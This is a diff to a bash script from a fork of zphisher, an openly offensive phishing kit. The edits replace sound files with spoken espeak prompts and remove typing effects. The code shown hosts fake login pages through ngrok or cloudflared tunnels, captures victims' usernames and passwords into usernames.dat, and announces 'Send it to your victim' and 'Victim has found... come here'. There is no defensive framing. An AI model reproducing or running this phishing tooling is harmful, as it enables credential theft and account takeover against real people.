@@ -356,7 +356,7 @@ dependencies() {
 	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
 	else
-		pkgs=(php curl wget unzip play-audio pv mpv-x espeak)
+		pkgs=(php curl wget unzip pv mpv-x espeak play-audio)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
 				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
@@ -450,7 +450,7 @@ install_cloudflared() {
 		if [[ ! -e "/system/bin/adb"  ]]; then
 		play-audio /data/data/com.termux/files/home/zphisher/.misc/Clinstall.wav &> /dev/null;
 		else
-		mpv /root/zphisher/.misc/Clinstall.wav &> /dev/null;
+		espeak -s 118 'cloudflared has started installing'&> /dev/null;
 		fi 
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
@@ -539,7 +539,7 @@ echo -e $g"[✓] You are granted to use this script"$wf
 if [[ ! -e "/system/bin/adb"  ]]; then
 play-audio /data/data/com.termux/files/home/zphisher/.misc/Gran.wav &> /dev/null;
 else
-mpv /root/zphisher/.misc/Gran.wav &> /dev/null;
+espeak -s 118 'you ate granted to use this script ' &> /dev/null;
 fi
 sleep 2.4
 else
@@ -577,9 +577,9 @@ capture_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
 	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT" | pv -qL 13
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD" | pv -qL 13
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat" | pv -qL 13
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
 	cat .server/www/usernames.txt >> usernames.dat
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
@@ -590,7 +590,7 @@ capture_data() {
 	if [[ ! -e "/system/bin/adb"  ]]; then
 	play-audio /data/data/com.termux/files/home/zphisher/.misc/victim.wav &> /dev/null;
 	else
-	mpv /root/zphisher/.misc/victim.wav &> /dev/null;
+	espeak -s 118 'Link has been generated. Send it to your victim' &> /dev/null;
 	fi
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then 
@@ -603,7 +603,7 @@ capture_data() {
 			if [[ ! -e "/system/bin/adb"  ]]; then
 			play-audio /data/data/com.termux/files/home/zphisher/.misc/misc3.mp3 &> /dev/null;
 			else
-			mpv /root/zphisher/.misc/misc3.mp3 &> /dev/null; 
+			espeak -s 118 'Hey! Victim has found... come here' &> /dev/null; 
 			fi
 			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
 			capture_creds
@@ -617,11 +617,11 @@ capture_data() {
 start_ngrok() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..." | pv -qL 13
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
 	if [[ ! -e "/system/bin/adb"  ]]; then
 	play-audio /data/data/com.termux/files/home/zphisher/.misc/ngrok.wav &> /dev/null;
 	else
-	mpv /root/zphisher/.misc/ngrok.wav &> /dev/null;
+	espeak -s 118 'ngrok has been started' &> /dev/null;
 	fi
     if [[ `command -v termux-chroot` ]]; then
         sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
@@ -651,7 +651,7 @@ start_cloudflared() {
 	if [[ ! -e "/system/bin/adb"  ]]; then
 	play-audio /data/data/com.termux/files/home/zphisher/.misc/cloud.wav &> /dev/null; 
 	else
-	mpv /root/zphisher/.misc/cloud.wav &> /dev/null;
+	espeak -s 118 'cloudflared has been started'&> /dev/null;
 	fi
     if [[ `command -v termux-chroot` ]]; then
                 sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
@@ -676,10 +676,10 @@ start_localhost() {
 	if [[ ! -e "/system/bin/adb"  ]]; then
 	play-audio /data/data/com.termux/files/home/zphisher/.misc/lhoat.wav &> /dev/null;
 	else
-	mpv /root/zphisher/.misc/lhoat.wav &> /dev/null; 
+	espeak -s 118 'local host has been started' &> /dev/null; 
 	fi
 	{ sleep 1; clear; banner_small; }
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}" | pv -qL 13
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
 	capture_data
 	play-audio /data/data/com.termux/files/home/zphisher/.misc/victim.wav &> /dev/null;
 }
@@ -699,7 +699,7 @@ tunnel_menu() {
 	if [[ ! -e "/system/bin/adb"  ]]; then
 	play-audio /data/data/com.termux/files/home/zphisher/.misc/port.wav &> /dev/null;
 	else
-	mpv /root/zphisher/.misc/port.wav &> /dev/null;
+	espeak -s 118 'Select your tunnelling option you want'&> /dev/null;
 	fi
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
 
@@ -1015,25 +1015,25 @@ main_menu() {
 			tunnel_menu;;
 		36)
 			echo ""
-			echo -e $K"This tool is getting ready"$w | pv -qL 15
+			echo -e $K"This tool is getting ready"$w
 			if [[ ! -e "/system/bin/adb"  ]]; then
 			play-audio /data/data/com.termux/files/home/zphisher/.misc/Not.wav &> /dev/null;
 			else
-			mpv /root/zphisher/.misc/Not.wav &> /dev/null;
+			espeak -s 118 'sorry this tool is getting ready. So kindly move to FFreward'  &> /dev/null;
 			fi
-			echo -e $K"So kindly move to FFreward"$w | pv -qL 15
+			echo -e $K"So kindly move to FFreward"$w
 			echo ""
 			main_menu
 			tunnel_menu;;
 		37)
 			echo ""
-			echo -e $K"This tool is getting ready"$w  | pv -qL 11                         
+			echo -e $K"This tool is getting ready"$w                     
 			if [[ ! -e "/system/bin/adb"  ]]; then
 			play-audio /data/data/com.termux/files/home/zphisher/.misc/Not.wav &> /dev/null;
 			else
-			mpv /root/zphisher/.misc/Not.wav &> /dev/null;
+			espeak -s 118 'sorry this tool is getting ready. So kindly move to FFreward' &> /dev/null;
 			fi
-			echo -e $K"So kindly move to FFreward"$w | pv -qL 11
+			echo -e $K"So kindly move to FFreward"$w
 			echo ""
 			main_menu
                         tunnel_menu;;
